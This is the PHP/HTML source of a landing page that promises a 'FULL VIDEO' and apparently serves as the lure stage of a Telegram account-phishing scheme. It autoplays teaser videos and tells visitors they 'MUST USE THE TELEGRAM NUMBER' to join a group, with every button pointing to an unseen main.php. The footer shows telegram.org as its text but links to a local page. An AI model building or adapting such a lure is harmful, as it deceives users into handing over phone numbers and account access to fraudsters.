<?php
// Periksa apakah pengguna mengakses URL lama
if ($_SERVER['HTTP_HOST'] === 'https://apx-livevip-4b29582189c2.herokuapp.com/') {
    // Redirect ke URL baru
    header("Location: https://apx-liivevip-e88d719f0334.herokuapp.com/", true, 301);
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>FULL VIDEO</title>
    <meta
      name="description"
      content="TELEGRAM GROUP GROUP ADMIN IF YOU WANT TO SEE THE FULL VIDEO, PLEASE JOIN TELEGRAM YOU MUST USE THE TELEGRAM NUMBER IF YOU WANT TO JOIN THE GROUP ðŸ‘‰JOIN THE GROUPðŸ‘ˆ ðŸ‘‰JOIN THE GROUPðŸ‘ˆ"
    />
    <link
      rel="icon"
      href="public/images/20.jpg"
      type="image/x-icon"
      sizes="32x25"
    />
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css"
    />
    <link rel="stylesheet" href="public/css/style.css" />
    <link rel="stylesheet" href="public/css/video-js.min.css" />
  </head>

  <body>
    <nav class="navbar bg-pink">
      <div class="container d-flex justify-content-center">
        <h3 class="text-white fw-bold">FULL VIDEO TELEGRAM</h3>
      </div>
    </nav>

    <div class="loading" style="display: none" id="loading">
      <div class="loader"></div>
    </div>

    <header>
      <div class="container">
        <div class="row justify-content-center">
          <div class="col-md-4 p-0 m-0">
            <img src="public/images/20.jpg" alt="" class="img-fluid" />
          </div>
        </div>
      </div>
    </header>
    <main>
      <div class="container">
        <div class="row justify-content-center mt-3">
          <div class="col-md-4">
            <div class="mb-3">
              <a
                href="main.php"
                class="btn btn-gradient text-uppercase w-100 fw-bold fs-5"
                onclick="window.location.href='main.php';"
              >
                Telegram Group
              </a>
            </div>
            <div class="mb-3">
              <a
                href="main.php"
                class="btn btn-gradient-3 text-uppercase w-100 fw-bold fs-5"
                onclick="window.location.href='main.php';"
              >
                Group Admin
              </a>
            </div>
            <div class="mb-3">
              <h6 class="text-center fw-bold">
                IF YOU WANT TO SEE THE FULL VIDEO, PLEASE JOIN TELEGRAM
              </h6>
            </div>
            <div class="mb-3">
              <a href="main.php" class="text-decoration-none">
                <img class="img-fluid" src="public/images/21.jpg" alt="" />
              </a>
            </div>
            <div class="mb-3">
              <h6 class="text-center fw-bold">
                YOU MUST USE THE TELEGRAM NUMBER IF YOU WANT TO JOIN THE GROUP
              </h6>
            </div>
            <div class="video-header mb-1">
              <video
                id="my-player"
                class="video-js"
                controls
                autoplay
                muted
                preload="auto"
                poster="public/images/21.jpg"
                data-setup="{}"
              >
                <source src="public/videos/3.mp4" type="video/mp4" />
                <p class="vjs-no-js">
                  To view this video please enable JavaScript, and consider
                  upgrading to a web browser that
                  <a
                    href="https://videojs.com/html5-video-support/"
                    target="_blank"
                  >
                    supports HTML5 video
                  </a>
                </p>
              </video>
            </div>

            <div class="mb-3 text-center">
              <a
                href="main.php"
                class="fw-bold text-decoration-none text-pink"
                onclick="window.location.href='main.php';"
              >
                ðŸ‘‰ JOIN THE GROUP ðŸ‘ˆ
              </a>
            </div>

            <div class="video-header mb-1">
              <video
                id="my-player"
                class="video-js"
                controls
                autoplay
                muted
                preload="auto"
                poster="public/images/21.jpg"
                data-setup="{}"
              >
                <source src="public/videos/1.mp4" type="video/mp4" />
                <p class="vjs-no-js">
                  To view this video please enable JavaScript, and consider
                  upgrading to a web browser that
                  <a
                    href="https://videojs.com/html5-video-support/"
                    target="_blank"
                  >
                    supports HTML5 video
                  </a>
                </p>
              </video>
            </div>

            <div class="mb-3 text-center">
              <a
                href="index.html"
                class="fw-bold text-decoration-none text-pink"
              >
                ðŸ‘‰ JOIN THE GROUP ðŸ‘ˆ
              </a>
            </div>
          </div>
        </div>
      </div>
    </main>
    <footer>
      <div class="bg-pink px-3 py-1 text-center">
        <a href="index.html" class="text-white">https://telegram.org</a>
        <span class="text-white">| 2024</span>
      </div>
    </footer>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <script src="https://code.jquery.com/jquery.min.js"></script>
    <script src="public/js/video.min.js"></script>
    <script type="text/javascript">
      $(document).ready(function () {
        var player = videojs("my-player");
      });
    </script>
  </body>
</html>
